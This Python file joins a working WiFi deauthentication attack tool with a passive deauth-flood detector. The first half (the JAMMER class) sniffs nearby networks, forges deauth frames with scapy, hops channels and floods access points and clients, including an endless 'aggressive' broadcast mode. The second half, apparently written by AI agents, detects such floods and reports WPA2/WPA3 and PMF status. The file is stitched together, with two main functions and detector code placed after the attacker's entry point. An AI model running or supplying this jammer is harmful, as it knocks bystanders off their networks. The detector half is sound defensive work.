
"""
WiFi Deauth Attack + WiFi Deauth Attack Detector
This script performs WiFi deauthentication attacks and detects potential deauth floods.
Utilizes channel hopping and forging frames from a single interface.
Passively monitors for deauthentication flood attacks.
Identifies WPA2 / WPA3 networks, detects PMF (Management Frame Protection), and alerts when deauth packet rates exceed configurable thresholds.

"""
import sys
import argparse
import threading
import os
import time
import signal
import random
import subprocess
import re
from collections import defaultdict, deque
from datetime import datetime
from pull import PULL
from scapy.sendrecv import sniff
from scapy.sendrecv import sendp
from scapy.sendrecv import send
from scapy.layers.dot11 import Dot11Beacon
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import Dot11Elt
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Dot11Deauth
from scapy.layers.dot11 import Dot11Disas
from scapy.layers.dot11 import Dot11FCS
from scapy.layers.eap   import EAPOL

class JAMMER:

	__ACCESSPOINTS = []
	__EXECUTED     = []
	__DECPACKETS   = []

	__BROADCAST    = "ff:ff:ff:ff:ff:ff"

	def __init__(self, prs):
		self.aggressive = prs.aggressive
		self.verbose    = prs.verbose
		self.exceptions = prs.exceptions

		self.interface  = prs.interface

		self.channel    = prs.channel
		self.essids     = prs.essids
		self.aps        = prs.aps
		self.stations   = prs.stations
		self.filters    = prs.filters

		self.packets    = prs.packets
		self.delay      = prs.delay
		self.reset      = prs.reset
		self.code       = prs.code

	def extract_essid(self, layers):
		retval = ''
		counter = 0

		try:
			while True:
				layer = layers[counter]
				if hasattr(layer, "ID") and layer.ID == 0:
					retval = layer.info.decode('utf-8')
					break
				else:
					counter += 1
		except IndexError:
			pass

		return retval
		
	def extract_channel(self, layers):
		retval = ''
		counter = 0

		try:
			while True:
				layer = layers[counter]
				if hasattr(layer, "ID") and layer.ID == 3 and layer.len == 1:
					retval = ord(layer.info)
					break
				else:
					counter += 1
		except IndexError:
			pass

		return retval

	def get_ess(self, bss):
		retval = ''

		for ap in self.__ACCESSPOINTS:
			if ap.get('bssid') == bss:
				retval = ap.get('essid')
				break

		return retval

	def get_channel(self, bss):
		retval = 0

		for ap in self.__ACCESSPOINTS:
			if ap.get('bssid') == bss:
				retval = ap.get('channel')

		return retval

	def filter_devices(self, sn, rc):
		retval = {
			'ap': '',
			'sta': '',
		}

		for ap in self.__ACCESSPOINTS:
			if ap.get('bssid') == sn:
				retval['ap'] = sn
				retval['sta'] = rc
			elif ap.get('bssid') == rc:
				retval['ap'] = rc
				retval['sta'] = sn

		return retval	

	def aggressive_run(self, ap, sta):
		pkt = self.forge(ap, sta)[0]

		self.write(ap, sta)

		while True:
			sendp(
				pkt,
				iface=self.interface,
				count=1,
				inter=0,
				verbose=False
			)	

	def aggressive_handler(self, ap, sta):		
		if (sta not in self.exceptions) and (self.aggressive) and (len(self.channel) == 1):
			t = threading.Thread(target=self.aggressive_run, args=(ap, sta))
			t.daemon = True
			t.start()


	def clarify(self, toappend):
		essid = toappend.get('essid')
		bssid = toappend.get('bssid')

		if self.essids:
			if essid in self.essids:
				if self.aps:
					if bssid in self.aps:
						self.__ACCESSPOINTS.append( toappend )
						self.aggressive_handler(bssid, self.__BROADCAST)
				else:
					self.__ACCESSPOINTS.append( toappend )
					self.aggressive_handler(bssid, self.__BROADCAST)
		else:
			if self.aps:
				if bssid in self.aps:
					self.__ACCESSPOINTS.append( toappend )
					self.aggressive_handler(bssid, self.__BROADCAST)
			else:
				self.__ACCESSPOINTS.append( toappend )
				self.aggressive_handler(bssid, self.__BROADCAST)

	def invalid(self, sta):
		for exception in self.exceptions:
			if sta.startswith(exception):
				return True

		return False

	def is_valid_sta(self, sta):
		if self.stations:
			if sta in self.stations:
				return True
			else:
				return False
		else:
			return True

	def get_crate(self, ch):
		retval = []

		for connection in self.__DECPACKETS:
			channel = connection.get('channel')

			if channel == ch:
				retval.append(connection)

		return retval

	def forge(self, ap, sta):
		def fpkt(sn, rc):
			pkt = RadioTap() / Dot11(
				type=0, 
				subtype=12,
				addr1=rc, 
				addr2=sn, 
				addr3=sn
				) / Dot11Deauth(
				reason=self.code
				)
			return pkt

		retval = []

		if sta != self.__BROADCAST:
			retval.append(fpkt(ap, sta))
			retval.append(fpkt(sta, ap))
		else:
			retval.append(fpkt(ap, sta))

		return retval

	def filtertify(self, ap, sta):
		if self.invalid(sta):
			return
		else:
			if ap not in self.filters and sta not in self.filters:
				if self.is_valid_sta(sta):
					onrun_form = (ap, sta)
					if onrun_form not in self.__EXECUTED:

						self.__EXECUTED.append(onrun_form)
						pkt_form = {
							'ap': ap,
							'sta': sta,
							'channel': self.get_channel(ap),
						}

						self.__DECPACKETS.append(pkt_form)

	def injector(self, pkt):
		if pkt.haslayer(Dot11Beacon):
			try:
				bssid = pkt.getlayer(Dot11FCS).addr2
			except:
				bssid = pkt.getlayer(Dot11).addr2

			essid = self.extract_essid(pkt.getlayer(Dot11Elt))
			channel = self.extract_channel(pkt.getlayer(Dot11Elt))

			toappend = {
				'essid': essid,
				'bssid': bssid,
				'channel': channel
			}

			if toappend not in self.__ACCESSPOINTS:
				self.clarify(
					toappend
				)

		else:
			sender = receiver = ""
			if pkt.haslayer(Dot11FCS) and pkt.getlayer(Dot11FCS).type == 2 and not pkt.haslayer(EAPOL):
				sender   = pkt.getlayer(Dot11FCS).addr2
				receiver = pkt.getlayer(Dot11FCS).addr1

			elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2 and not pkt.haslayer(EAPOL):
				sender   = pkt.getlayer(Dot11).addr2
				receiver = pkt.getlayer(Dot11).addr1

			if sender and receiver:
				result  = self.filter_devices(sender, receiver)

				if result.get('ap') and result.get('sta'):
					self.filtertify(result.get('ap'), result.get('sta'))

	def write(self, ap, sta):
		if self.verbose:
			pull.print("*",
				"Sent Deauths Count [{count}] Code [{code}] ({sdeveloper}) {sender} <--> ({rdeveloper}) {receiver} ({essid}) [{channel}]".format(
					count=pull.RED+str(self.packets)+pull.END,
					code =pull.GREEN+str(self.code)+pull.END,
					sender=pull.DARKCYAN+ap.upper()+pull.END,
					receiver=pull.DARKCYAN+sta.upper()+pull.END,
					sdeveloper=pull.PURPLE+pull.get_mac(ap)+pull.END,
					rdeveloper=pull.PURPLE+pull.get_mac(sta)+pull.END,
					essid=pull.YELLOW+self.get_ess(ap)+pull.END,
					channel=pull.RED+str(self.get_channel(ap))+pull.END
				),
				pull.YELLOW
			)
		else:
			pull.print("*",
				"Sent Deauths Count [{count}] Code [{code}] {sender} <--> {receiver} ({essid}) [{channel}]".format(
					count=pull.RED+str(self.packets)+pull.END,
					code =pull.GREEN+str(self.code)+pull.END,
					sender=pull.DARKCYAN+ap.upper()+pull.END,
					receiver=pull.DARKCYAN+sta.upper()+pull.END,
					essid=pull.YELLOW+self.get_ess(ap)+pull.END,
					channel=pull.RED+str(self.get_channel(ap))+pull.END
				),
				pull.YELLOW
			)

	def jammer(self):
		while True:
			ch = random.choice(self.channel)
			subprocess.call(['iwconfig', self.interface, 'channel', str(ch)])
			time.sleep(0.5)

			crate = self.get_crate(ch)

			for connection in crate:
				ap = connection.get( 'ap' )
				sta = connection.get( 'sta' )
				channel = connection.get( 'channel' )

				pkts = self.forge(ap, sta)
				for pkt in pkts:
					sendp(pkt, iface=self.interface, count=self.packets, inter=self.delay, verbose=False)

				self.write(ap, sta)

			self.resetter()

			time.sleep(0.5)

	def resetter(self):
		if self.reset:
			if len(self.__EXECUTED) >= self.reset:
				self.__EXECUTED = []
				self.__DECPACKETS = []

	def engage(self):
		t = threading.Thread(target=self.jammer)
		t.daemon = True
		t.start()

		sniff(iface=self.interface, prn=self.injector)

class PARSER:

	def __init__(self, opts):
		self.help        = self.help(opts.help)
		self.world       = opts.world
		self.aggressive  = opts.aggressive
		self.exceptions  = self.exceptions(opts.nbroadcast)
		self.verbose     = opts.verbose
		self.interface   = self.interface(opts.interface)

		self.channel     = self.channel(opts.channel)
		self.essids      = self.form_essids(opts.aps)
		self.aps         = self.form_macs(opts.aps)
		self.stations    = self.form_macs(opts.stations)
		self.filters     = self.form_macs(opts.filters)

		self.packets     = opts.packets if opts.packets > 0 else pull.halt("Number of packets Must Be >= 1", True, pull.RED)
		self.delay       = opts.delay   if opts.delay   >= 0 else pull.halt("Delay Interval Must be >= 0", True, pull.RED)
		self.reset       = opts.reset   if ((opts.reset == 0) or (opts.reset >= 5)) else pull.halt("Reset Must Be >= 5. ")
		self.code        = opts.code    if ((opts.code >= 1) and (opts.code <= 66)) else pull.halt("Code Must Be Greater Greater >= 1 and <= 66")

	def help(self, _help):
		if _help:
			pull.help()

	def exceptions(self, nbroadcast):
		retval = []
		if not nbroadcast:
			retval = ['00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:']
		else:
			retval = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:']
		return retval

	def form_essids(self, essids):
		retval = []
		if essids:
			toloop = essids.split(",")
			for essid in toloop:
				if not re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", essid):
					retval.append(essid)

		return retval

	def form_macs(self, bssids):
		retval = []
		if bssids:
			toloop = bssids.split(",")
			for bssid in toloop:
				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", bssid):
					retval.append(bssid.lower())

		return retval

	def channel(self, ch):
		retval = list(range(1,15)) if self.world else list(range(1,12))
		if ch:
			if ch in retval:
				return [ch]
			else:
				pull.halt("Invalid Channel Given.", True, pull.RED)
		else:
			return retval

	def interface(self, iface):
		def getNICnames():
			ifaces = []
			dev = open('/proc/net/dev', 'r')
			data = dev.read()
			for n in re.findall('[a-zA-Z0-9]+:', data):
				ifaces.append(n.rstrip(":"))
			return ifaces

		def confirmMon(iface):
			co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
			data = co.communicate()[0].decode()
			card = re.findall('Mode:[A-Za-z]+', data)[0]	
			if "Monitor" in card:
				return True
			else:
				return False

		if iface:
			ifaces = getNICnames()
			if iface in ifaces:
				if confirmMon(iface):
					return iface
				else:
					pull.halt("Interface Not In Monitor Mode [%s]" % (pull.RED + iface + pull.END), True, pull.RED)
			else:
				pull.halt("Interface Not Found. [%s]" % (pull.RED + iface + pull.END), True, pull.RED)
		else:
			pull.halt("Interface Not Provided. Specify an Interface!", True, pull.RED)

def main():
	parser = argparse.ArgumentParser(add_help=False)

	parser.add_argument('-h', '--help'        , dest="help"     , default=False, action="store_true")
	parser.add_argument('-i', '--interface'   , dest="interface", default="", type=str)

	parser.add_argument('-c', '--channel'     , dest="channel"  , default=0 , type=int)
	parser.add_argument('-a', '--accesspoints', dest="aps"   , default="", type=str)
	parser.add_argument('-s', '--stations'    , dest="stations", default="", type=str)
	parser.add_argument('-f', '--filters'     , dest="filters" , default="", type=str)

	parser.add_argument('-p', '--packets'     , dest="packets" , default=5 , type=int)
	parser.add_argument('-d', '--delay'       , dest="delay"   , default=0.1, type=int)
	parser.add_argument('-r', '--reset'       , dest="reset"   , default=0  , type=int)
	parser.add_argument('--code'              , dest="code"    , default=7  , type=int)

	parser.add_argument('--world'             , dest="world"     , default=False, action="store_true")
	parser.add_argument('--aggressive'        , dest="aggressive", default=False, action="store_true")
	parser.add_argument('--no-broadcast'      , dest="nbroadcast", default=False, action="store_true")
	parser.add_argument('--verbose'           , dest="verbose"   , default=False, action="store_true")

	options = parser.parse_args()
	parser = PARSER(options)

	pull.print(
		"*",
		"IFACE [{interface}] CHANNEL [{channel}] VERBOSE [{verbose}]".format(
			interface=pull.DARKCYAN+parser.interface+pull.END,
			channel=pull.DARKCYAN+str(("HOP" if len(parser.channel) > 1 else parser.channel[0]))+pull.END,
			verbose=pull.DARKCYAN+("True" if parser.verbose else "False")+pull.END
		),
		pull.DARKCYAN,
	)

	pull.print(
		"*",
		"APS [{aps}] STATIONS [{stations}] FILTERS [{filters}]".format(
			aps=pull.DARKCYAN+str(len(parser.aps))+pull.END,
			stations=pull.DARKCYAN+str(len(parser.stations))+pull.END,
			filters=pull.DARKCYAN+str(len(parser.filters))+pull.END
		),
		pull.DARKCYAN
	)

	pull.print(
		"*",
		"PACKETS [{packets}] DELAY [{delay}] RST [{reset}] CD [{code}]".format(
			packets=pull.DARKCYAN+str(parser.packets)+pull.END,
			delay=pull.DARKCYAN+str(parser.delay)+pull.END,
			reset=pull.DARKCYAN+str(parser.reset)+pull.END,
			code=pull.DARKCYAN+str(parser.code)+pull.END
		),
		pull.DARKCYAN
	)

	pull.print(
		"^",
		"Engaing With Jammer Now",
		pull.GREEN
	)

	jammer = JAMMER(parser)
	jammer.engage()

if __name__ == "__main__":
    pull = PULL()
    main()

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
    C = {
        'red':    Fore.RED,
        'green':  Fore.GREEN,
        'yellow': Fore.YELLOW,
        'cyan':   Fore.CYAN,
        'purple': Fore.MAGENTA,
        'bold':   Style.BRIGHT,
        'end':    Style.RESET_ALL,
    }
except ImportError:
    C = defaultdict(str)


# ─── Constants ────────────────────────────────────────────────────────────────

# 802.11 RSN (WPA2/WPA3) cipher/AKM suite selectors
RSN_CIPHER = {
    0x00: "Use group",   0x01: "WEP-40",    0x02: "TKIP",
    0x04: "CCMP-128",    0x05: "WEP-104",   0x06: "BIP-CMAC-128",
    0x08: "GCMP-128",    0x09: "GCMP-256",  0x0A: "CCMP-256",
}
RSN_AKM = {
    0x01: "WPA2-802.1X",   0x02: "WPA2-PSK",
    0x03: "FT-802.1X",     0x04: "FT-PSK",
    0x05: "WPA2-802.1X-SHA256", 0x06: "WPA2-PSK-SHA256",
    0x08: "SAE",           0x09: "FT-SAE",        # SAE = WPA3
    0x12: "OWE",           0x13: "FT-SAE-EXT",
    0x18: "PASN",
}
RSN_PMF_CAPABLE  = 0x80   # bit 7 of RSN capabilities
RSN_PMF_REQUIRED = 0x40   # bit 6 of RSN capabilities

WPA_VENDOR_OUI = b'\x00\x50\xf2\x01'   # Microsoft WPA1 OUI

# IE tag numbers
TAG_SSID       = 0
TAG_CHANNEL    = 3
TAG_RSN        = 48   # WPA2/WPA3
TAG_VENDOR     = 221  # WPA1, WPA3-Transition mode etc.
TAG_HE_CAPS    = 255  # 802.11ax (Wi-Fi 6) — WPA3 often appears here


# ─── RSN Parser (Coder agent output) ──────────────────────────────────────────

def parse_rsn(data: bytes) -> dict:
    """Parse RSN Information Element (tag 48) to extract security details."""
    result = {
        'version': 0,
        'group_cipher': '',
        'pairwise_ciphers': [],
        'akm_suites': [],
        'pmf_capable': False,
        'pmf_required': False,
        'security': 'Unknown',
    }

    if len(data) < 4:
        return result

    try:
        idx = 0
        result['version'] = int.from_bytes(data[idx:idx+2], 'little')
        idx += 2

        oui = data[idx:idx+3]
        suite = data[idx+3]
        result['group_cipher'] = RSN_CIPHER.get(suite, f"0x{suite:02x}")
        idx += 4

        if idx + 2 > len(data):
            return result

        pairwise_count = int.from_bytes(data[idx:idx+2], 'little')
        idx += 2
        for _ in range(pairwise_count):
            if idx + 4 > len(data): break
            suite = data[idx+3]
            result['pairwise_ciphers'].append(RSN_CIPHER.get(suite, f"0x{suite:02x}"))
            idx += 4

        if idx + 2 > len(data):
            return result

        akm_count = int.from_bytes(data[idx:idx+2], 'little')
        idx += 2
        for _ in range(akm_count):
            if idx + 4 > len(data): break
            suite = data[idx+3]
            result['akm_suites'].append(RSN_AKM.get(suite, f"0x{suite:02x}"))
            idx += 4

        if idx + 2 <= len(data):
            caps = int.from_bytes(data[idx:idx+2], 'little')
            result['pmf_capable']  = bool(caps & RSN_PMF_CAPABLE)
            result['pmf_required'] = bool(caps & RSN_PMF_REQUIRED)

        # Classify security level
        akms = result['akm_suites']
        if 'SAE' in akms or 'FT-SAE' in akms:
            result['security'] = 'WPA3'
            if 'WPA2-PSK' in akms or 'WPA2-PSK-SHA256' in akms:
                result['security'] = 'WPA2/WPA3-Transition'
        elif 'OWE' in akms:
            result['security'] = 'WPA3-OWE'
        elif any('WPA2' in a or 'FT' in a or '802.1X' in a for a in akms):
            result['security'] = 'WPA2'
        elif akms:
            result['security'] = 'WPA-Enterprise'

    except Exception:
        pass

    return result


def has_wpa1(vendor_data: bytes) -> bool:
    """Check if vendor IE contains WPA1 OUI."""
    return vendor_data[:4] == WPA_VENDOR_OUI


def parse_beacon(pkt) -> dict | None:
    """
    Extract full security profile from a Dot11Beacon.
    Returns dict with ssid, bssid, channel, security, pmf_*, rsn details.
    """
    try:
        dot11 = pkt.getlayer(Dot11FCS) or pkt.getlayer(Dot11)
        bssid = dot11.addr2 if dot11 else None
        if not bssid:
            return None

        info = {
            'bssid':          bssid,
            'ssid':           '',
            'channel':        0,
            'security':       'Open',
            'pmf_capable':    False,
            'pmf_required':   False,
            'akm_suites':     [],
            'pairwise':       [],
            'group_cipher':   '',
            'has_wpa1':       False,
        }

        layer = pkt.getlayer(Dot11Elt)
        while layer:
            tag_id = getattr(layer, 'ID', None)

            if tag_id == TAG_SSID:
                try:
                    info['ssid'] = layer.info.decode('utf-8', errors='replace')
                except Exception:
                    info['ssid'] = repr(layer.info)

            elif tag_id == TAG_CHANNEL:
                if layer.info:
                    info['channel'] = layer.info[0]

            elif tag_id == TAG_RSN:
                rsn = parse_rsn(bytes(layer.info))
                info['security']     = rsn['security']
                info['pmf_capable']  = rsn['pmf_capable']
                info['pmf_required'] = rsn['pmf_required']
                info['akm_suites']   = rsn['akm_suites']
                info['pairwise']     = rsn['pairwise_ciphers']
                info['group_cipher'] = rsn['group_cipher']

            elif tag_id == TAG_VENDOR:
                if bytes(layer.info)[:4] == WPA_VENDOR_OUI:
                    info['has_wpa1'] = True
                    if info['security'] == 'Open':
                        info['security'] = 'WPA'

            layer = layer.payload.getlayer(Dot11Elt) if layer.payload else None

        return info

    except Exception:
        return None


# ─── Flood Detector (Optimizer agent output) ──────────────────────────────────

class FloodDetector:
    """
    Sliding-window deauth flood detector.
    Tracks deauth frame counts per (ap, station) pair within a time window.
    Optimizer: uses deque with maxlen for O(1) appends, auto-evicts old entries.
    """

    def __init__(self, window_sec=5, threshold=20, cooldown_sec=30):
        self.window    = window_sec
        self.threshold = threshold
        self.cooldown  = cooldown_sec

        # (ap, sta) -> deque of timestamps
        self._counts: dict[tuple, deque] = defaultdict(lambda: deque())
        # (ap, sta) -> last alert time (cooldown)
        self._alerted: dict[tuple, float] = {}
        self._lock = threading.Lock()

    def record(self, ap: str, sta: str) -> tuple[bool, int]:
        """
        Record a deauth frame. Returns (is_flood, count_in_window).
        Debugger fix: normalise MAC case before keying to avoid duplicates.
        """
        ap  = ap.lower()
        sta = sta.lower()
        key = (ap, sta)
        now = time.time()

        with self._lock:
            dq = self._counts[key]
            # Evict entries outside the window (optimizer: O(n) worst case but
            # n is bounded by threshold*window so stays tiny in practice)
            while dq and now - dq[0] > self.window:
                dq.popleft()

            dq.append(now)
            count = len(dq)

            if count >= self.threshold:
                last = self._alerted.get(key, 0)
                if now - last > self.cooldown:
                    self._alerted[key] = now
                    return True, count

        return False, count

    def stats(self) -> list[dict]:
        """Return current top connections sorted by deauth count."""
        now = time.time()
        rows = []
        with self._lock:
            for (ap, sta), dq in self._counts.items():
                active = sum(1 for t in dq if now - t <= self.window)
                if active > 0:
                    rows.append({'ap': ap, 'sta': sta, 'count': active})
        return sorted(rows, key=lambda r: r['count'], reverse=True)


# ─── Main Detector (Coder + Debugger agent output) ────────────────────────────

class DeauthDetector:

    BROADCAST = 'ff:ff:ff:ff:ff:ff'

    def __init__(self, args):
        self.iface     = args.interface
        self.threshold = args.threshold
        self.window    = args.window
        self.cooldown  = args.cooldown
        self.logfile   = args.log
        self.verbose   = args.verbose

        self.networks: dict[str, dict] = {}   # bssid -> beacon info
        self.flood     = FloodDetector(self.window, self.threshold, self.cooldown)
        self._lock     = threading.Lock()
        self._pkt_count = 0
        self._alert_count = 0

    # ── Helpers ──

    def _ts(self) -> str:
        return datetime.now().strftime('%H:%M:%S')

    def _log(self, msg: str):
        if self.logfile:
            with open(self.logfile, 'a') as f:
                f.write(f"[{datetime.now().isoformat()}] {msg}\n")

    def _security_badge(self, info: dict) -> str:
        sec = info.get('security', 'Open')
        pmf_req = info.get('pmf_required', False)
        pmf_cap = info.get('pmf_capable', False)

        if sec.startswith('WPA3'):
            badge = C['green'] + sec
        elif sec == 'WPA2/WPA3-Transition':
            badge = C['yellow'] + sec
        elif sec.startswith('WPA2'):
            badge = C['cyan'] + sec
        else:
            badge = C['red'] + sec

        pmf = ''
        if pmf_req:
            pmf = C['green'] + ' [PMF-Required]'
        elif pmf_cap:
            pmf = C['yellow'] + ' [PMF-Capable]'
        else:
            pmf = C['red'] + ' [No-PMF]'

        return badge + pmf + C['end']

    # ── Packet handlers ──

    def _handle_beacon(self, pkt):
        info = parse_beacon(pkt)
        if not info:
            return
        bssid = info['bssid']
        with self._lock:
            if bssid not in self.networks:
                self.networks[bssid] = info
                ssid = info['ssid'] or '<hidden>'
                print(
                    f"{C['cyan']}[{self._ts()}][NET]{C['end']} "
                    f"{C['bold']}{ssid}{C['end']} "
                    f"({bssid.upper()}) ch={info['channel']} "
                    f"{self._security_badge(info)}"
                )
                self._log(f"NETWORK ssid={ssid} bssid={bssid} security={info['security']} "
                          f"pmf_cap={info['pmf_capable']} pmf_req={info['pmf_required']}")

    def _handle_deauth(self, pkt):
        try:
            dot11 = pkt.getlayer(Dot11FCS) or pkt.getlayer(Dot11)
            if not dot11:
                return

            sender   = dot11.addr2
            receiver = dot11.addr1
            if not sender or not receiver:
                return

            deauth = pkt.getlayer(Dot11Deauth) or pkt.getlayer(Dot11Disas)
            reason = deauth.reason if deauth else 0

            # Identify which is AP, which is station
            with self._lock:
                nets = dict(self.networks)

            ap  = sender   if sender   in nets else (receiver if receiver in nets else sender)
            sta = receiver if sender   in nets else (sender   if receiver in nets else receiver)

            is_flood, count = self.flood.record(ap, sta)

            if self.verbose:
                net = nets.get(ap, {})
                ssid = net.get('ssid', '?')
                sec  = net.get('security', 'Unknown')
                pmf  = net.get('pmf_required', False)
                print(
                    f"{C['yellow']}[{self._ts()}][DEAUTH]{C['end']} "
                    f"AP={ap.upper()} STA={sta.upper()} "
                    f"reason={reason} count={count} "
                    f"ssid={ssid} sec={sec} pmf={pmf}"
                )

            if is_flood:
                self._alert_count += 1
                net = nets.get(ap, {})
                ssid = net.get('ssid', 'Unknown')
                sec  = net.get('security', 'Unknown')
                pmf_req = net.get('pmf_required', False)
                pmf_cap = net.get('pmf_capable', False)

                # WPA3 with PMF-Required is resistant to deauth floods
                if pmf_req:
                    note = (C['green'] +
                            "  ✓ PMF-Required — deauth frames should be ignored by clients" +
                            C['end'])
                elif pmf_cap:
                    note = (C['yellow'] +
                            "  ⚠ PMF-Capable but not required — some clients may be affected" +
                            C['end'])
                else:
                    note = (C['red'] +
                            "  ✗ No PMF — clients are vulnerable to this attack" +
                            C['end'])

                alert = (
                    f"\n{C['red']}{C['bold']}[{self._ts()}][ALERT] DEAUTH FLOOD DETECTED{C['end']}\n"
                    f"  SSID    : {C['bold']}{ssid}{C['end']}\n"
                    f"  AP      : {ap.upper()}\n"
                    f"  Target  : {sta.upper()} ({'broadcast' if sta == self.BROADCAST else 'unicast'})\n"
                    f"  Count   : {count} deauths in {self.window}s (threshold={self.threshold})\n"
                    f"  Reason  : {reason}\n"
                    f"  Security: {self._security_badge(net)}\n"
                    f"{note}\n"
                )
                print(alert)
                self._log(f"ALERT flood ap={ap} sta={sta} count={count} ssid={ssid} "
                          f"security={sec} pmf_required={pmf_req} pmf_capable={pmf_cap}")

        except Exception as e:
            if self.verbose:
                print(f"[DEBUG] deauth parse error: {e}")

    def _handle_pkt(self, pkt):
        self._pkt_count += 1
        if pkt.haslayer(Dot11Beacon):
            self._handle_beacon(pkt)
        elif pkt.haslayer(Dot11Deauth) or pkt.haslayer(Dot11Disas):
            self._handle_deauth(pkt)

    # ── Status printer thread ──

    def _status_loop(self):
        while True:
            time.sleep(10)
            top = self.flood.stats()[:5]
            nets = len(self.networks)
            wpa3 = sum(1 for n in self.networks.values() if 'WPA3' in n.get('security',''))
            wpa2 = sum(1 for n in self.networks.values() if 'WPA2' in n.get('security','') and 'WPA3' not in n.get('security',''))
            pmf  = sum(1 for n in self.networks.values() if n.get('pmf_required'))

            print(
                f"\n{C['purple']}[{self._ts()}][STATUS]{C['end']} "
                f"pkts={self._pkt_count} nets={nets} "
                f"WPA3={wpa3} WPA2={wpa2} PMF-Required={pmf} "
                f"alerts={self._alert_count}"
            )
            if top:
                print(f"  Top deauth sources (last {self.window}s):")
                for r in top:
                    print(f"    AP={r['ap'].upper()} STA={r['sta'].upper()} count={r['count']}")

    # ── Entry point ──

    def run(self):
        print(
            f"\n{C['green']}{C['bold']}WiFi Deauth Attack Detector{C['end']}\n"
            f"  Interface : {self.iface}\n"
            f"  Threshold : {self.threshold} deauths / {self.window}s window\n"
            f"  Cooldown  : {self.cooldown}s between repeat alerts\n"
            f"  Log file  : {self.logfile or 'disabled'}\n"
            f"  Mode      : PASSIVE — no packets transmitted\n"
        )

        t = threading.Thread(target=self._status_loop, daemon=True)
        t.start()

        try:
            sniff(iface=self.iface, prn=self._handle_pkt, store=False)
        except KeyboardInterrupt:
            print(f"\n{C['yellow']}[~] Stopped. "
                  f"Captured {self._pkt_count} packets, "
                  f"{self._alert_count} alerts fired.{C['end']}")
        except PermissionError:
            sys.exit(f"{C['red']}[!] Permission denied — run with sudo.{C['end']}")
        except Exception as e:
            sys.exit(f"{C['red']}[!] Error: {e}{C['end']}")


# ─── Tests (Debugger agent output) ────────────────────────────────────────────

def run_tests():
    print("Running unit tests...\n")
    passed = failed = 0

    def ok(name, result):
        nonlocal passed, failed
        sym = C['green'] + '✓' + C['end'] if result else C['red'] + '✗' + C['end']
        print(f"  {sym} {name}")
        if result: passed += 1
        else: failed += 1

    # Test 1: RSN parser — WPA3 SAE
    wpa3_ie = bytes([
        0x01,0x00,                         # version 1
        0x00,0x0f,0xac,0x04,               # group: CCMP-128
        0x01,0x00, 0x00,0x0f,0xac,0x04,    # 1 pairwise: CCMP-128
        0x01,0x00, 0x00,0x0f,0xac,0x08,    # 1 AKM: SAE
        0xC0,0x00,                         # caps: PMF-Required(0x40) | PMF-Capable(0x80)
    ])
    r = parse_rsn(wpa3_ie)
    ok("WPA3 SAE detection",        r['security'] == 'WPA3')
    ok("SAE in AKM suites",         'SAE' in r['akm_suites'])
    ok("PMF capable flag",          r['pmf_capable'])
    ok("PMF required flag",         r['pmf_required'])
    ok("CCMP-128 pairwise cipher",  'CCMP-128' in r['pairwise_ciphers'])

    # Test 2: RSN parser — WPA2 PSK, no PMF
    wpa2_ie = bytes([
        0x01,0x00,
        0x00,0x0f,0xac,0x04,
        0x01,0x00, 0x00,0x0f,0xac,0x04,
        0x01,0x00, 0x00,0x0f,0xac,0x02,    # AKM: WPA2-PSK
        0x00,0x00,                         # no PMF
    ])
    r2 = parse_rsn(wpa2_ie)
    ok("WPA2-PSK detection",        r2['security'] == 'WPA2')
    ok("WPA2 PMF capable=False",    not r2['pmf_capable'])
    ok("WPA2 PMF required=False",   not r2['pmf_required'])

    # Test 3: Transition mode (SAE + PSK)
    trans_ie = bytes([
        0x01,0x00,
        0x00,0x0f,0xac,0x04,
        0x01,0x00, 0x00,0x0f,0xac,0x04,
        0x02,0x00,                         # 2 AKMs
        0x00,0x0f,0xac,0x02,               # WPA2-PSK
        0x00,0x0f,0xac,0x08,               # SAE
        0x80,0x00,
    ])
    r3 = parse_rsn(trans_ie)
    ok("WPA2/WPA3 transition mode", r3['security'] == 'WPA2/WPA3-Transition')

    # Test 4: FloodDetector threshold
    fd = FloodDetector(window_sec=5, threshold=5, cooldown_sec=0)
    results = [fd.record('aa:bb:cc:dd:ee:ff', '11:22:33:44:55:66') for _ in range(6)]
    ok("No alert before threshold",  not results[3][0])
    ok("Alert at threshold",          results[4][0])

    # Test 5: MAC normalisation (debugger fix)
    fd2 = FloodDetector(window_sec=5, threshold=3, cooldown_sec=0)
    fd2.record('AA:BB:CC:DD:EE:FF', '11:22:33:44:55:66')
    fd2.record('aa:bb:cc:dd:ee:ff', '11:22:33:44:55:66')
    _, count = fd2.record('Aa:Bb:Cc:Dd:Ee:Ff', '11:22:33:44:55:66')
    ok("MAC case normalisation", count == 3)

    # Test 6: WPA1 vendor OUI detection
    ok("WPA1 OUI match",    has_wpa1(b'\x00\x50\xf2\x01\x01\x00'))
    ok("WPA1 OUI no-match", not has_wpa1(b'\x00\x50\xf2\x02\x01\x00'))

    print(f"\n  {passed} passed, {failed} failed\n")
    return failed == 0


# ─── CLI ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description='Passive WiFi deauthentication attack detector with WPA2/WPA3/PMF analysis'
    )
    parser.add_argument('-i', '--interface', default='',
        help='Monitor mode interface (e.g. wlan0mon)')
    parser.add_argument('-t', '--threshold', type=int, default=20,
        help='Deauth frames per window to trigger alert (default: 20)')
    parser.add_argument('-w', '--window', type=int, default=5,
        help='Detection time window in seconds (default: 5)')
    parser.add_argument('-c', '--cooldown', type=int, default=30,
        help='Seconds between repeat alerts for same pair (default: 30)')
    parser.add_argument('-l', '--log', default='',
        help='Log alerts to file')
    parser.add_argument('-v', '--verbose', action='store_true',
        help='Print every deauth frame (noisy)')
    parser.add_argument('--test', action='store_true',
        help='Run unit tests and exit')

    args = parser.parse_args()

    if args.test:
        ok = run_tests()
        sys.exit(0 if ok else 1)

    if not args.interface:
        parser.error("Specify a monitor-mode interface with -i (e.g. -i wlan0mon)")

    detector = DeauthDetector(args)
    detector.run()


if __name__ == '__main__':
    main()